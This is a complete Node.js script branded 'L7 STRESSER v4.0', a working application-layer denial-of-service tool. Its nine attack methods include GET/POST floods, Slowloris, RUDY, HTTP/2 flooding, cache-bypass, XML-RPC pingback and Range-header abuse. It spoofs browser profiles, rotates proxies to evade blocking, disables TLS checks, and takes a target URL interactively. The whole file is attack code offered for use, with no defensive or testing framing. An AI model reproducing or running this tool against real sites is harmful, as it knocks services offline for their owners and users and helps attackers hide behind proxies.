#!/usr/bin/env node

const https = require('https');
const http = require('http');
const http2 = require('http2');
const readline = require('readline');
const fs = require('fs').promises;
const crypto = require('crypto');
const { URL } = require('url');
const net = require('net');
const zlib = require('zlib');

// Disable TLS certificate validation
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// ============= COLORS & UI =============
const c = {
    reset: '\x1b[0m',
    bold: '\x1b[1m',
    dim: '\x1b[2m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
};

const BANNER = `
${c.cyan}${c.bold}
╔════════════════════════════════════════════════════════════╗
║                                                            ║
║    ${c.magenta}L7 STRESSER v4.0${c.cyan} - ${c.green}Multi-Method Edition${c.cyan}           ║
║                                                            ║
║    ${c.yellow}✓${c.cyan} 9 L7 Attack Methods    ${c.yellow}✓${c.cyan} Smart Proxy Rotation    ║
║    ${c.yellow}✓${c.cyan} HTTP/1.1 & HTTP/2      ${c.yellow}✓${c.cyan} TLS Fingerprinting     ║
║    ${c.yellow}✓${c.cyan} Adaptive Concurrency   ${c.yellow}✓${c.cyan} Real-time Stats        ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
${c.reset}
`;

// ============= BROWSER PROFILES =============
const BROWSER_PROFILES = [
    {
        name: 'Chrome 120',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        headers: {
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        },
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
    },
    {
        name: 'Firefox 121',
        ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384',
    },
    {
        name: 'Safari 17',
        ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        },
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
    },
];

// ============= CONFIGURATION =============
const config = {
    proxies: [],
    proxyHealth: new Map(),
    proxyLastUsed: new Map(),
    stats: {
        totalRequests: 0,
        successful: 0,
        failed: 0,
        statusCodes: {},
        startTime: null,
        bytesSent: 0,
        bytesReceived: 0,
    }
};

// ============= UTILITY FUNCTIONS =============
function getRandomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function getRandomHeaders(url, profile = null) {
    if (!profile) profile = getRandomElement(BROWSER_PROFILES);
    
    return {
        'User-Agent': profile.ua,
        'Accept': profile.headers.Accept || 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        ...profile.headers
    };
}

function addCacheBuster(url) {
    const separator = url.includes('?') ? '&' : '?';
    return `${url}${separator}_=${Date.now()}&r=${crypto.randomBytes(4).toString('hex')}`;
}

function generatePostData(type = 'json') {
    if (type === 'json') {
        return JSON.stringify({
            query: crypto.randomBytes(16).toString('hex'),
            data: Array(5).fill(0).map(() => crypto.randomBytes(8).toString('hex')),
            timestamp: Date.now()
        });
    } else {
        return 'data=' + 'A'.repeat(Math.floor(Math.random() * 1000) + 500);
    }
}

function updateStats(success, statusCode = null, bytesSent = 0, bytesReceived = 0) {
    config.stats.totalRequests++;
    if (success) {
        config.stats.successful++;
    } else {
        config.stats.failed++;
    }
    config.stats.bytesSent += bytesSent;
    config.stats.bytesReceived += bytesReceived;
    
    if (statusCode) {
        config.stats.statusCodes[statusCode] = (config.stats.statusCodes[statusCode] || 0) + 1;
    }
}

function displayStats() {
    const elapsed = (Date.now() - config.stats.startTime) / 1000;
    const rps = (config.stats.totalRequests / elapsed).toFixed(0);
    const successRate = config.stats.totalRequests > 0 
        ? ((config.stats.successful / config.stats.totalRequests) * 100).toFixed(1)
        : '0.0';
    
    console.log(`\n${c.cyan}${'═'.repeat(65)}${c.reset}`);
    console.log(`${c.bold}${c.blue}STATS${c.reset} | Time: ${c.yellow}${elapsed.toFixed(1)}s${c.reset} | Requests: ${c.green}${config.stats.totalRequests}${c.reset} | RPS: ${c.magenta}${rps}${c.reset}`);
    console.log(`Success: ${c.green}${config.stats.successful}${c.reset} (${successRate}%) | Failed: ${c.red}${config.stats.failed}${c.reset}`);
    console.log(`Sent: ${c.blue}${(config.stats.bytesSent / 1024).toFixed(0)} KB${c.reset} | Received: ${c.cyan}${(config.stats.bytesReceived / 1024).toFixed(0)} KB${c.reset}`);
    
    if (Object.keys(config.stats.statusCodes).length > 0) {
        const topCodes = Object.entries(config.stats.statusCodes)
            .sort(([, a], [, b]) => b - a)
            .slice(0, 5)
            .map(([k, v]) => `${k}:${v}`)
            .join(' | ');
        console.log(`Status Codes: ${c.yellow}${topCodes}${c.reset}`);
    }
    console.log(`${c.cyan}${'═'.repeat(65)}${c.reset}`);
}

// ============= PROXY MANAGEMENT =============
async function loadProxies(filePath = 'proxies.txt') {
    try {
        const data = await fs.readFile(filePath, 'utf-8');
        const lines = data.split('\n')
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#'));
        
        if (lines.length === 0) {
            console.log(`${c.red}✗ No proxies found in ${filePath}${c.reset}`);
            return false;
        }
        
        config.proxies = lines.map(proxy => 
            proxy.startsWith('http') ? proxy : `http://${proxy}`
        );
        
        console.log(`${c.green}✓ Loaded ${config.proxies.length} proxies${c.reset}`);
        return true;
    } catch (err) {
        console.log(`${c.red}✗ Failed to load proxies: ${err.message}${c.reset}`);
        return false;
    }
}

function getHealthyProxy() {
    if (config.proxies.length === 0) return null;
    
    const now = Date.now();
    const availableProxies = config.proxies.filter(proxy => {
        const health = config.proxyHealth.get(proxy);
        const lastUsed = config.proxyLastUsed.get(proxy) || 0;
        
        // Filter out proxies used in last 100ms and unhealthy ones
        if (now - lastUsed < 100) return false;
        if (health && health.score < 10) return false;
        
        return true;
    });
    
    if (availableProxies.length === 0) {
        // Reset all
        config.proxyHealth.clear();
        config.proxyLastUsed.clear();
        return getRandomElement(config.proxies);
    }
    
    const selected = getRandomElement(availableProxies);
    config.proxyLastUsed.set(selected, now);
    return selected;
}

function updateProxyHealth(proxy, success, latency = 0) {
    if (!config.proxyHealth.has(proxy)) {
        config.proxyHealth.set(proxy, {
            success: 0,
            fails: 0,
            totalLatency: 0,
            score: 100
        });
    }
    
    const health = config.proxyHealth.get(proxy);
    if (success) {
        health.success++;
        health.totalLatency += latency;
    } else {
        health.fails++;
    }
    
    const total = health.success + health.fails;
    const successRate = health.success / total;
    health.score = successRate * 100;
}

// ============= HTTP REQUEST FUNCTIONS =============
function makeProxyRequest(targetUrl, method, headers, postData, proxy) {
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(targetUrl);
        const parsedProxy = new URL(proxy);
        
        const options = {
            host: parsedProxy.hostname,
            port: parsedProxy.port || 80,
            method: 'CONNECT',
            path: `${parsedUrl.hostname}:${parsedUrl.protocol === 'https:' ? 443 : 80}`,
            headers: {
                'Host': parsedUrl.hostname,
                'Proxy-Connection': 'keep-alive'
            }
        };
        
        const proxyReq = http.request(options);
        proxyReq.setTimeout(3000);
        
        proxyReq.on('connect', (res, socket) => {
            if (res.statusCode !== 200) {
                reject(new Error('Proxy connection failed'));
                return;
            }
            
            const reqOptions = {
                host: parsedUrl.hostname,
                port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                path: parsedUrl.pathname + parsedUrl.search,
                method: method,
                headers: headers,
                socket: socket,
                agent: false
            };
            
            const clientReq = (parsedUrl.protocol === 'https:' ? https : http).request(reqOptions);
            clientReq.setTimeout(3000);
            
            clientReq.on('response', (response) => {
                let data = '';
                response.on('data', chunk => data += chunk);
                response.on('end', () => {
                    resolve({ statusCode: response.statusCode, data: data });
                });
            });
            
            clientReq.on('error', reject);
            clientReq.on('timeout', () => {
                clientReq.destroy();
                reject(new Error('Request timeout'));
            });
            
            if (postData) {
                clientReq.write(postData);
            }
            clientReq.end();
        });
        
        proxyReq.on('error', reject);
        proxyReq.on('timeout', () => {
            proxyReq.destroy();
            reject(new Error('Proxy timeout'));
        });
        
        proxyReq.end();
    });
}

function makeDirectRequest(targetUrl, method, headers, postData) {
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(targetUrl);
        
        const options = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
            path: parsedUrl.pathname + parsedUrl.search,
            method: method,
            headers: headers,
            rejectUnauthorized: false,
            timeout: 3000
        };
        
        const lib = parsedUrl.protocol === 'https:' ? https : http;
        const req = lib.request(options);
        
        req.on('response', (response) => {
            let data = '';
            response.on('data', chunk => data += chunk);
            response.on('end', () => {
                resolve({ statusCode: response.statusCode, data: data });
            });
        });
        
        req.on('error', reject);
        req.on('timeout', () => {
            req.destroy();
            reject(new Error('Request timeout'));
        });
        
        if (postData) {
            req.write(postData);
        }
        req.end();
    });
}

// ============= L7 ATTACK METHODS =============

// Method 1: HTTP GET Flood
class HTTPGetFlood {
    constructor(url, duration, threads) {
        this.url = url;
        this.duration = duration;
        this.threads = threads;
        this.running = false;
    }
    
    async worker() {
        const endTime = Date.now() + this.duration * 1000;
        const profile = getRandomElement(BROWSER_PROFILES);
        let concurrency = 10;
        
        while (this.running && Date.now() < endTime) {
            const batch = [];
            
            for (let i = 0; i < concurrency; i++) {
                const proxy = getHealthyProxy();
                const targetUrl = addCacheBuster(this.url);
                const headers = getRandomHeaders(targetUrl, profile);
                const startTime = Date.now();
                
                const request = proxy 
                    ? makeProxyRequest(targetUrl, 'GET', headers, null, proxy)
                    : makeDirectRequest(targetUrl, 'GET', headers, null);
                
                batch.push(
                    request
                        .then(response => {
                            const latency = Date.now() - startTime;
                            updateStats(true, response.statusCode, 500, response.data.length);
                            if (proxy) updateProxyHealth(proxy, true, latency);
                        })
                        .catch(err => {
                            updateStats(false);
                            if (proxy) updateProxyHealth(proxy, false);
                        })
                );
            }
            
            await Promise.all(batch);
        }
    }
    
    async start() {
        console.log(`\n${c.green}▶ Starting HTTP GET Flood${c.reset}`);
        console.log(`Target: ${c.cyan}${this.url}${c.reset} | Duration: ${c.yellow}${this.duration}s${c.reset} | Threads: ${c.magenta}${this.threads}${c.reset}\n`);
        
        config.stats.startTime = Date.now();
        this.running = true;
        
        const workers = [];
        for (let i = 0; i < this.threads; i++) {
            workers.push(this.worker());
        }
        
        const statsInterval = setInterval(() => {
            if (this.running) displayStats();
        }, 5000);
        
        setTimeout(() => this.running = false, this.duration * 1000);
        
        await Promise.all(workers);
        clearInterval(statsInterval);
        displayStats();
        console.log(`\n${c.green}✓ Attack completed${c.reset}\n`);
    }
}

// Method 2: HTTP POST Flood
class HTTPPostFlood extends HTTPGetFlood {
    async worker() {
        const endTime = Date.now() + this.duration * 1000;
        const profile = getRandomElement(BROWSER_PROFILES);
        let concurrency = 10;
        
        while (this.running && Date.now() < endTime) {
            const batch = [];
            
            for (let i = 0; i < concurrency; i++) {
                const proxy = getHealthyProxy();
                const targetUrl = addCacheBuster(this.url);
                const headers = getRandomHeaders(targetUrl, profile);
                const postData = generatePostData('json');
                headers['Content-Type'] = 'application/json';
                headers['Content-Length'] = Buffer.byteLength(postData);
                
                const startTime = Date.now();
                
                const request = proxy 
                    ? makeProxyRequest(targetUrl, 'POST', headers, postData, proxy)
                    : makeDirectRequest(targetUrl, 'POST', headers, postData);
                
                batch.push(
                    request
                        .then(response => {
                            const latency = Date.now() - startTime;
                            updateStats(true, response.statusCode, postData.length, response.data.length);
                            if (proxy) updateProxyHealth(proxy, true, latency);
                        })
                        .catch(err => {
                            updateStats(false, null, postData.length);
                            if (proxy) updateProxyHealth(proxy, false);
                        })
                );
            }
            
            await Promise.all(batch);
        }
    }
    
    async start() {
        console.log(`\n${c.green}▶ Starting HTTP POST Flood${c.reset}`);
        console.log(`Target: ${c.cyan}${this.url}${c.reset} | Duration: ${c.yellow}${this.duration}s${c.reset} | Threads: ${c.magenta}${this.threads}${c.reset}\n`);
        
        config.stats.startTime = Date.now();
        this.running = true;
        
        const workers = [];
        for (let i = 0; i < this.threads; i++) {
            workers.push(this.worker());
        }
        
        const statsInterval = setInterval(() => {
            if (this.running) displayStats();
        }, 5000);
        
        setTimeout(() => this.running = false, this.duration * 1000);
        
        await Promise.all(workers);
        clearInterval(statsInterval);
        displayStats();
        console.log(`\n${c.green}✓ Attack completed${c.reset}\n`);
    }
}

// Method 3: Slowloris
class Slowloris {
    constructor(url, duration, connections) {
        this.url = url;
        this.duration = duration;
        this.connections = connections;
        this.running = false;
        this.sockets = [];
    }
    
    async worker() {
        const endTime = Date.now() + this.duration * 1000;
        const parsedUrl = new URL(this.url);
        
        while (this.running && Date.now() < endTime) {
            try {
                const socket = net.connect({
                    host: parsedUrl.hostname,
                    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80)
                });
                
                socket.on('connect', () => {
                    const headers = `GET ${parsedUrl.pathname} HTTP/1.1\r\nHost: ${parsedUrl.hostname}\r\nUser-Agent: ${getRandomElement(BROWSER_PROFILES).ua}\r\nAccept: */*\r\n`;
                    socket.write(headers);
                    
                    const keepAliveInterval = setInterval(() => {
                        if (socket.writable && Date.now() < endTime) {
                            socket.write(`X-a: ${Math.random()}\r\n`);
                        } else {
                            clearInterval(keepAliveInterval);
                            socket.end();
                        }
                    }, 15000);
                    
                    this.sockets.push({ socket, interval: keepAliveInterval });
                });
                
                socket.on('error', () => socket.destroy());
                
                await new Promise(resolve => setTimeout(resolve, 100));
            } catch (err) {
                // Continue
            }
        }
    }
    
    async start() {
        console.log(`\n${c.green}▶ Starting Slowloris Attack${c.reset}`);
        console.log(`Target: ${c.cyan}${this.url}${c.reset} | Duration: ${c.yellow}${this.duration}s${c.reset} | Connections: ${c.magenta}${this.connections}${c.reset}\n`);
        
        this.running = true;
        
        const workers = [];
        for (let i = 0; i < this.connections; i++) {
            workers.push(this.worker());
        }
        
        setTimeout(() => {
            this.running = false;
            this.sockets.forEach(({ socket, interval }) => {
                clearInterval(interval);
                socket.destroy();
            });
        }, this.duration * 1000);
        
        await Promise.all(workers);
        console.log(`\n${c.green}✓ Attack completed${c.reset}\n`);
    }
}

// Method 4: RUDY (R-U-Dead-Yet)
class RUDY {
    constructor(url, duration, connections) {
        this.url = url;
        this.duration = duration;
        this.connections = connections;
        this.running = false;
    }
    
    async worker() {
        const endTime = Date.now() + this.duration * 1000;
        const parsedUrl = new URL(this.url);
        
        while (this.running && Date.now() < endTime) {
            try {
                const socket = net.connect({
                    host: parsedUrl.hostname,
                    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80)
                });
                
                socket.on('connect', () => {
                    const postData = 'data=' + 'A'.repeat(10000);
                    const headers = `POST ${parsedUrl.pathname} HTTP/1.1\r\nHost: ${parsedUrl.hostname}\r\nUser-Agent: ${getRandomElement(BROWSER_PROFILES).ua}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${postData.length}\r\n\r\n`;
                    
                    socket.write(headers);
                    
                    let bytesSent = 0;
                    const sendInterval = setInterval(() => {
                        if (socket.writable && bytesSent < postData.length && Date.now() < endTime) {
                            socket.write(postData.charAt(bytesSent));
                            bytesSent++;
                        } else {
                            clearInterval(sendInterval);
                            socket.end();
                        }
                    }, 1000);
                });
                
                socket.on('error', () => socket.destroy());
                
                await new Promise(resolve => setTimeout(resolve, 100));
            } catch (err) {
                // Continue
            }
        }
    }
    
    async start() {
        console.log(`\n${c.green}▶ Starting RUDY Attack${c.reset}`);
        console.log(`Target: ${c.cyan}${this.url}${c.reset} | Duration: ${c.yellow}${this.duration}s${c.reset} | Connections: ${c.magenta}${this.connections}${c.reset}\n`);
        
        this.running = true;
        
        const workers = [];
        for (let i = 0; i < this.connections; i++) {
            workers.push(this.worker());
        }
        
        setTimeout(() => this.running = false, this.duration * 1000);
        
        await Promise.all(workers);
        console.log(`\n${c.green}✓ Attack completed${c.reset}\n`);
    }
}

// Method 5: HTTP/2 Flood
class HTTP2Flood {
    constructor(url, duration, threads) {
        this.url = url;
        this.duration = duration;
        this.threads = threads;
        this.running = false;
    }
    
    async worker() {
        const endTime = Date.now() + this.duration * 1000;
        const parsedUrl = new URL(this.url);
        
        while (this.running && Date.now() < endTime) {
            try {
                const client = http2.connect(parsedUrl.origin, {
                    rejectUnauthorized: false
                });
                
                const batch = [];
                for (let i = 0; i < 10; i++) {
                    const headers = {
                        ':method': 'GET',
                        ':path': parsedUrl.pathname + '?_=' + Date.now(),
                        ':scheme': parsedUrl.protocol.replace(':', ''),
                        ':authority': parsedUrl.hostname,
                        'user-agent': getRandomElement(BROWSER_PROFILES).ua
                    };
                    
                    const req = client.request(headers);
                    
                    batch.push(new Promise((resolve) => {
                        req.on('response', () => {
                            updateStats(true, 200, 500, 0);
                            resolve();
                        });
                        req.on('error', () => {
                            updateStats(false);
                            resolve();
                        });
                        req.end();
                    }));
                }
                
                await Promise.all(batch);
                client.close();
            } catch (err) {
                // Continue
            }
        }
    }
    
    async start() {
        console.log(`\n${c.green}▶ Starting HTTP/2 Flood${c.reset}`);
        console.log(`Target: ${c.cyan}${this.url}${c.reset} | Duration: ${c.yellow}${this.duration}s${c.reset} | Threads: ${c.magenta}${this.threads}${c.reset}\n`);
        
        config.stats.startTime = Date.now();
        this.running = true;
        
        const workers = [];
        for (let i = 0; i < this.threads; i++) {
            workers.push(this.worker());
        }
        
        const statsInterval = setInterval(() => {
            if (this.running) displayStats();
        }, 5000);
        
        setTimeout(() => this.running = false, this.duration * 1000);
        
        await Promise.all(workers);
        clearInterval(statsInterval);
        displayStats();
        console.log(`\n${c.green}✓ Attack completed${c.reset}\n`);
    }
}

// Method 6: Cache Bypass
class CacheBypass extends HTTPGetFlood {
    async worker() {
        const endTime = Date.now() + this.duration * 1000;
        const profile = getRandomElement(BROWSER_PROFILES);
        let concurrency = 10;
        
        while (this.running && Date.now() < endTime) {
            const batch = [];
            
            for (let i = 0; i < concurrency; i++) {
                const proxy = getHealthyProxy();
                const targetUrl = addCacheBuster(this.url);
                const headers = getRandomHeaders(targetUrl, profile);
                headers['Cache-Control'] = 'no-cache, no-store, must-revalidate';
                headers['Pragma'] = 'no-cache';
                headers['Expires'] = '0';
                
                const startTime = Date.now();
                
                const request = proxy 
                    ? makeProxyRequest(targetUrl, 'GET', headers, null, proxy)
                    : makeDirectRequest(targetUrl, 'GET', headers, null);
                
                batch.push(
                    request
                        .then(response => {
                            const latency = Date.now() - startTime;
                            updateStats(true, response.statusCode, 500, response.data.length);
                            if (proxy) updateProxyHealth(proxy, true, latency);
                        })
                        .catch(err => {
                            updateStats(false);
                            if (proxy) updateProxyHealth(proxy, false);
                        })
                );
            }
            
            await Promise.all(batch);
        }
    }
    
    async start() {
        console.log(`\n${c.green}▶ Starting Cache Bypass Attack${c.reset}`);
        console.log(`Target: ${c.cyan}${this.url}${c.reset} | Duration: ${c.yellow}${this.duration}s${c.reset} | Threads: ${c.magenta}${this.threads}${c.reset}\n`);
        
        config.stats.startTime = Date.now();
        this.running = true;
        
        const workers = [];
        for (let i = 0; i < this.threads; i++) {
            workers.push(this.worker());
        }
        
        const statsInterval = setInterval(() => {
            if (this.running) displayStats();
        }, 5000);
        
        setTimeout(() => this.running = false, this.duration * 1000);
        
        await Promise.all(workers);
        clearInterval(statsInterval);
        displayStats();
        console.log(`\n${c.green}✓ Attack completed${c.reset}\n`);
    }
}

// Method 7: XML-RPC Flood
class XMLRPCFlood extends HTTPPostFlood {
    async worker() {
        const endTime = Date.now() + this.duration * 1000;
        const profile = getRandomElement(BROWSER_PROFILES);
        let concurrency = 10;
        
        while (this.running && Date.now() < endTime) {
            const batch = [];
            
            for (let i = 0; i < concurrency; i++) {
                const proxy = getHealthyProxy();
                const xmlPayload = `<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>${this.url}</string></value></param><param><value><string>${this.url}</string></value></param></params></methodCall>`;
                
                const headers = getRandomHeaders(this.url, profile);
                headers['Content-Type'] = 'text/xml';
                headers['Content-Length'] = Buffer.byteLength(xmlPayload);
                
                const startTime = Date.now();
                
                const request = proxy 
                    ? makeProxyRequest(this.url, 'POST', headers, xmlPayload, proxy)
                    : makeDirectRequest(this.url, 'POST', headers, xmlPayload);
                
                batch.push(
                    request
                        .then(response => {
                            const latency = Date.now() - startTime;
                            updateStats(true, response.statusCode, xmlPayload.length, response.data.length);
                            if (proxy) updateProxyHealth(proxy, true, latency);
                        })
                        .catch(err => {
                            updateStats(false, null, xmlPayload.length);
                            if (proxy) updateProxyHealth(proxy, false);
                        })
                );
            }
            
            await Promise.all(batch);
        }
    }
    
    async start() {
        console.log(`\n${c.green}▶ Starting XML-RPC Flood${c.reset}`);
        console.log(`Target: ${c.cyan}${this.url}${c.reset} | Duration: ${c.yellow}${this.duration}s${c.reset} | Threads: ${c.magenta}${this.threads}${c.reset}\n`);
        
        config.stats.startTime = Date.now();
        this.running = true;
        
        const workers = [];
        for (let i = 0; i < this.threads; i++) {
            workers.push(this.worker());
        }
        
        const statsInterval = setInterval(() => {
            if (this.running) displayStats();
        }, 5000);
        
        setTimeout(() => this.running = false, this.duration * 1000);
        
        await Promise.all(workers);
        clearInterval(statsInterval);
        displayStats();
        console.log(`\n${c.green}✓ Attack completed${c.reset}\n`);
    }
}

// Method 8: Range Header Attack
class RangeHeaderAttack extends HTTPGetFlood {
    async worker() {
        const endTime = Date.now() + this.duration * 1000;
        const profile = getRandomElement(BROWSER_PROFILES);
        let concurrency = 10;
        
        while (this.running && Date.now() < endTime) {
            const batch = [];
            
            for (let i = 0; i < concurrency; i++) {
                const proxy = getHealthyProxy();
                const targetUrl = addCacheBuster(this.url);
                const headers = getRandomHeaders(targetUrl, profile);
                
                // Create multiple range requests
                const ranges = Array(10).fill(0).map((_, idx) => `${idx * 100}-${idx * 100 + 99}`);
                headers['Range'] = `bytes=${ranges.join(',')}`;
                
                const startTime = Date.now();
                
                const request = proxy 
                    ? makeProxyRequest(targetUrl, 'GET', headers, null, proxy)
                    : makeDirectRequest(targetUrl, 'GET', headers, null);
                
                batch.push(
                    request
                        .then(response => {
                            const latency = Date.now() - startTime;
                            updateStats(true, response.statusCode, 500, response.data.length);
                            if (proxy) updateProxyHealth(proxy, true, latency);
                        })
                        .catch(err => {
                            updateStats(false);
                            if (proxy) updateProxyHealth(proxy, false);
                        })
                );
            }
            
            await Promise.all(batch);
        }
    }
    
    async start() {
        console.log(`\n${c.green}▶ Starting Range Header Attack${c.reset}`);
        console.log(`Target: ${c.cyan}${this.url}${c.reset} | Duration: ${c.yellow}${this.duration}s${c.reset} | Threads: ${c.magenta}${this.threads}${c.reset}\n`);
        
        config.stats.startTime = Date.now();
        this.running = true;
        
        const workers = [];
        for (let i = 0; i < this.threads; i++) {
            workers.push(this.worker());
        }
        
        const statsInterval = setInterval(() => {
            if (this.running) displayStats();
        }, 5000);
        
        setTimeout(() => this.running = false, this.duration * 1000);
        
        await Promise.all(workers);
        clearInterval(statsInterval);
        displayStats();
        console.log(`\n${c.green}✓ Attack completed${c.reset}\n`);
    }
}

// Method 9: Mixed Methods (combines multiple)
class MixedAttack extends HTTPGetFlood {
    async worker() {
        const endTime = Date.now() + this.duration * 1000;
        const profile = getRandomElement(BROWSER_PROFILES);
        let concurrency = 10;
        
        while (this.running && Date.now() < endTime) {
            const batch = [];
            
            for (let i = 0; i < concurrency; i++) {
                const proxy = getHealthyProxy();
                const method = getRandomElement(['GET', 'POST', 'HEAD']);
                const targetUrl = addCacheBuster(this.url);
                const headers = getRandomHeaders(targetUrl, profile);
                
                let postData = null;
                if (method === 'POST') {
                    postData = generatePostData(Math.random() > 0.5 ? 'json' : 'form');
                    headers['Content-Type'] = postData.startsWith('{') ? 'application/json' : 'application/x-www-form-urlencoded';
                    headers['Content-Length'] = Buffer.byteLength(postData);
                }
                
                const startTime = Date.now();
                
                const request = proxy 
                    ? makeProxyRequest(targetUrl, method, headers, postData, proxy)
                    : makeDirectRequest(targetUrl, method, headers, postData);
                
                batch.push(
                    request
                        .then(response => {
                            const latency = Date.now() - startTime;
                            updateStats(true, response.statusCode, postData ? postData.length : 500, response.data.length);
                            if (proxy) updateProxyHealth(proxy, true, latency);
                        })
                        .catch(err => {
                            updateStats(false);
                            if (proxy) updateProxyHealth(proxy, false);
                        })
                );
            }
            
            await Promise.all(batch);
        }
    }
    
    async start() {
        console.log(`\n${c.green}▶ Starting Mixed Methods Attack${c.reset}`);
        console.log(`Target: ${c.cyan}${this.url}${c.reset} | Duration: ${c.yellow}${this.duration}s${c.reset} | Threads: ${c.magenta}${this.threads}${c.reset}\n`);
        
        config.stats.startTime = Date.now();
        this.running = true;
        
        const workers = [];
        for (let i = 0; i < this.threads; i++) {
            workers.push(this.worker());
        }
        
        const statsInterval = setInterval(() => {
            if (this.running) displayStats();
        }, 5000);
        
        setTimeout(() => this.running = false, this.duration * 1000);
        
        await Promise.all(workers);
        clearInterval(statsInterval);
        displayStats();
        console.log(`\n${c.green}✓ Attack completed${c.reset}\n`);
    }
}

// ============= MAIN MENU =============
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function question(query) {
    return new Promise(resolve => rl.question(query, resolve));
}

async function main() {
    console.log(BANNER);
    
    const useProxies = await question(`${c.yellow}Use proxies? (y/n):${c.reset} `);
    if (useProxies.toLowerCase() === 'y') {
        await loadProxies('proxies.txt');
    }
    
    console.log(`\n${c.cyan}${'═'.repeat(65)}${c.reset}`);
    console.log(`${c.bold}${c.yellow}SELECT L7 ATTACK METHOD:${c.reset}`);
    console.log(`${c.cyan}${'═'.repeat(65)}${c.reset}`);
    console.log(`  ${c.green}1.${c.reset} HTTP GET Flood      ${c.dim}(Fast & reliable)${c.reset}`);
    console.log(`  ${c.green}2.${c.reset} HTTP POST Flood     ${c.dim}(JSON/Form data)${c.reset}`);
    console.log(`  ${c.green}3.${c.reset} Slowloris           ${c.dim}(Slow connection)${c.reset}`);
    console.log(`  ${c.green}4.${c.reset} RUDY (R-U-Dead-Yet) ${c.dim}(Slow POST)${c.reset}`);
    console.log(`  ${c.green}5.${c.reset} HTTP/2 Flood        ${c.dim}(Protocol specific)${c.reset}`);
    console.log(`  ${c.green}6.${c.reset} Cache Bypass        ${c.dim}(Anti-cache headers)${c.reset}`);
    console.log(`  ${c.green}7.${c.reset} XML-RPC Flood       ${c.dim}(XML payload)${c.reset}`);
    console.log(`  ${c.green}8.${c.reset} Range Header Attack ${c.dim}(Byte range abuse)${c.reset}`);
    console.log(`  ${c.green}9.${c.reset} Mixed Methods       ${c.dim}(Random combination)${c.reset}`);
    console.log(`${c.cyan}${'═'.repeat(65)}${c.reset}\n`);
    
    const choice = await question(`${c.yellow}Select method (1-9):${c.reset} `);
    const url = await question(`${c.yellow}Target URL:${c.reset} `);
    const duration = parseInt(await question(`${c.yellow}Duration (seconds):${c.reset} `));
    const threads = parseInt(await question(`${c.yellow}Threads/Connections:${c.reset} `));
    
    let finalUrl = url.startsWith('http') ? url : `https://${url}`;
    
    let attack;
    switch (choice) {
        case '1':
            attack = new HTTPGetFlood(finalUrl, duration, threads);
            break;
        case '2':
            attack = new HTTPPostFlood(finalUrl, duration, threads);
            break;
        case '3':
            attack = new Slowloris(finalUrl, duration, threads);
            break;
        case '4':
            attack = new RUDY(finalUrl, duration, threads);
            break;
        case '5':
            attack = new HTTP2Flood(finalUrl, duration, threads);
            break;
        case '6':
            attack = new CacheBypass(finalUrl, duration, threads);
            break;
        case '7':
            attack = new XMLRPCFlood(finalUrl, duration, threads);
            break;
        case '8':
            attack = new RangeHeaderAttack(finalUrl, duration, threads);
            break;
        case '9':
            attack = new MixedAttack(finalUrl, duration, threads);
            break;
        default:
            console.log(`${c.red}✗ Invalid choice${c.reset}`);
            rl.close();
            return;
    }
    
    await attack.start();
    rl.close();
}

if (require.main === module) {
    main().catch(err => {
        console.error(`\n${c.red}✗ Error: ${err.message}${c.reset}`);
        rl.close();
        process.exit(1);
    });
}

module.exports = { HTTPGetFlood, HTTPPostFlood, Slowloris, RUDY, HTTP2Flood };
